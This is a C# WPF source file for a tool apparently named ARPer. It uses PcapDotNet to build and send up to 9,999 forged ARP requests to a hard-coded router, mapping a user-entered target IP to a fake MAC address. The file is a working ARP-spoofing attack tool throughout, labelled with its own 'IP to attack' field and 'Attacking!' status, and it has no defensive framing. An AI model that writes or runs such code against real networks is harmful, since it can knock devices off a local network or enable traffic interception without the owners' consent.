using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Gre;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.Igmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.IpV6;
using PcapDotNet.Packets.Transport;
using System.ComponentModel;

namespace ARPer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        BackgroundWorker bg;
        public MainWindow()
        {
            InitializeComponent();
        }

        private void attackMe_GotFocus(object sender, RoutedEventArgs e)
        {
            //attackMe.Foreground = Brushes.Black;
            if (attackMe.Text == "IP to attack")
            {
                attackMe.Text = "";
            }
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            attackMe.Focus();
        }

        private void button_Click(object sender, RoutedEventArgs e)
        {
            status.Text = "Validating...";
            if (isIpValid(attackMe.Text))
            {
                string mac = ""; //TODO: make this customizable
                string ip = ""; //TODO: this too
                if (radioButton1.IsChecked == true)
                {
                    //fuzzy logic
                    mac = "FC:B0:C4:A2:4E:50";
                    ip = "192.168.1.1";
                }
                else if (radioButton2.IsChecked == true)
                {
                    //this better work
                    mac = "C8:3A:35:07:41:68";
                    ip = "192.168.0.1";
                }
                int numPacks = Convert.ToInt32(numPackets.Text);
                if (!((numPacks > 0) && (numPacks < 10000)))
                {
                    numPackets.Focus();
                    numPackets.SelectAll();
                    return;
                }
                bg = new BackgroundWorker();
                bg.WorkerReportsProgress = true;
                bg.DoWork += new DoWorkEventHandler(sendArp);//attackMe.Text, mac, ip));
                    //delegate (object o, DoWorkEventArgs args)
                    //{
                    //    BackgroundWorker b = o as BackgroundWorker;
                    //    for (int i = 0; i < 100; i++)
                    //    {
                    //        this.Dispatcher.Invoke((Action)(() =>
                    //        {
                    //            sendArp(attackMe.Text, mac, ip);
                    //        }));
                    //        //b.ReportProgress(i);
                    //    }
                    //});
                bg.ProgressChanged += new ProgressChangedEventHandler(
                    delegate (object o, ProgressChangedEventArgs args)
                    {
                        progressBar.Value = args.ProgressPercentage;
                    });
                bg.RunWorkerCompleted += new RunWorkerCompletedEventHandler(
                    delegate (object o, RunWorkerCompletedEventArgs args)
                    {
                        status.Text = "All done!";
                        progressBar.Value = 100;
                    });
                List<object> arguments = new List<object>();
                arguments.Add(attackMe.Text);
                arguments.Add(mac);
                arguments.Add(ip);
                arguments.Add(numPacks);
                status.Text = "Attacking!";
                bg.RunWorkerAsync(arguments);
                //sendArp(attackMe.Text, mac, ip); 
            }
            else
            {
                attackMe.Focus();
                attackMe.SelectAll();
                status.Text = "Invalid IP";
            }
        }

        private bool isIpValid(string text)
        {
            //throw new NotImplementedException();
            var quads = text.Split('.');

            // if we do not have 4 quads, return false
            if (!(quads.Length == 4)) return false;

            // for each quad
            foreach (var quad in quads)
            {
                int q;
                // if parse fails 
                // or length of parsed int != length of quad string (i.e.; '1' vs '001')
                // or parsed int < 0
                // or parsed int > 255
                // return false
                if (!Int32.TryParse(quad, out q)
                    || !q.ToString().Length.Equals(quad.Length)
                    || q < 0
                    || q > 255) { return false; }
            }
            return true;
        }

        private void sendArp(object sender, DoWorkEventArgs e) 
        {
            List<object> genericlist = e.Argument as List<object>;
            string attackIP = genericlist[0].ToString();
            string routerMAC = genericlist[1].ToString();
            string routerIP = genericlist[2].ToString();
            int reps = Convert.ToInt32(genericlist[3]);
            string myMAC = "A0:A8:CD:9A:CB:AD";
            string arpSenderMAC = "0A:5A:7B:30:3F:71";
            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
            if (allDevices.Count == 0)
            {
                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
                throw new Exception(); //TODO: catch exception and show error
            }
            //for (int i = 0; i != allDevices.Count; ++i) //TODO: show this in GUI somehow
            //{
            //    LivePacketDevice device = allDevices[i];
            //    Console.Write((i + 1) + ". " + device.Name);
            //    if (device.Description != null)
            //        Console.WriteLine(" (" + device.Description + ")");
            //    else
            //        Console.WriteLine(" (No description available)");
            //}
            int deviceIndex = 2; //TODO: make this choosable
            PacketDevice selectedDevice = allDevices[deviceIndex];
            using (PacketCommunicator communicator = selectedDevice.Open(100, PacketDeviceOpenAttributes.Promiscuous, 1000))
            {
                MacAddress source = new MacAddress(myMAC);
                MacAddress destination = new MacAddress(routerMAC);
                EthernetLayer ethLayer = new EthernetLayer
                {
                    Source = source,
                    Destination = destination
                };
                ArpLayer arpLayer = new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = ArpOperation.Request,
                    SenderHardwareAddress = makeMAC (arpSenderMAC),
                    SenderProtocolAddress = makeIP (attackIP),
                    TargetHardwareAddress = new byte[] { 0, 0, 0, 0, 0, 0 }.AsReadOnly(),
                    TargetProtocolAddress = makeIP(routerIP)
                };
                PacketBuilder builder = new PacketBuilder(ethLayer, arpLayer);
                Packet packet = builder.Build(DateTime.Now);
                for (int i = 0; i < reps; i++)
                {
                    communicator.SendPacket(packet);
                    bg.ReportProgress((i * 100)/reps);
                }
            }
        }

        private ReadOnlyCollection<byte> makeIP(string attackIP)
        {
            List<byte> ip = new List<byte>();
            ip.AddRange(attackIP.Split('.').Select(b => Convert.ToByte(b, 10)));
            return ip.AsReadOnly();
        }

        private ReadOnlyCollection<byte> makeMAC(string arpSenderMAC)
        {
            List<byte> mac = new List<byte>();
            mac.AddRange(arpSenderMAC.Split(':').Select(b => Convert.ToByte(b, 16)));
            return mac.AsReadOnly();
        }
    }
}
